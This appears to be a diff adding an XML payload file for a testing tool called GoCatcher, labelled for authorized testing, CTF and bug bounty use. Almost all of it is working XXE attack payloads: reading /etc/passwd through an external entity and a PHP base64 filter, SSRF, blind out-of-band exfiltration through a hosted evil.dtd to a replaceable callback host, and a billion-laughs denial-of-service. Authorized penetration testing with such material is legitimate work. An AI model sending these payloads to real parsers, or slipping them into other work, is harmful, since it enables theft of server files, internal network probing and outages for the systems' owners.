@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- ===========================================================================
+     GoCatcher :: XXE test payloads  (application/xml)
+     FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
+
+     Send one DOCTYPE block at a time as the request body to an XML parser.
+     The OOB/blind variants exfiltrate to GoCatcher via /evil.dtd (also hosted
+     here) and show up in the request log. Replace 127.0.0.1:8080 as needed.
+     =========================================================================== -->
+
+<!-- (1) Classic local file read -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<data>&xxe;</data>
+
+<!-- (2) SSRF via XXE (parser fetches GoCatcher):
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/xxe-ssrf"> ]>
+<data>&xxe;</data>
+-->
+
+<!-- (3) Blind OOB exfiltration (uses /evil.dtd hosted by GoCatcher):
+<!DOCTYPE foo [
+  <!ENTITY % ext SYSTEM "http://127.0.0.1:8080/evil.dtd">
+  %ext;
+  %exfil;
+]>
+<data>&send;</data>
+-->
+
+<!-- (4) PHP filter base64 read (classic PHP wrapper):
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<data>&xxe;</data>
+-->
+
+<!-- (5) Billion-laughs DoS (use with care, authorized tests only):
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<lolz>&lol3;</lolz>
+-->
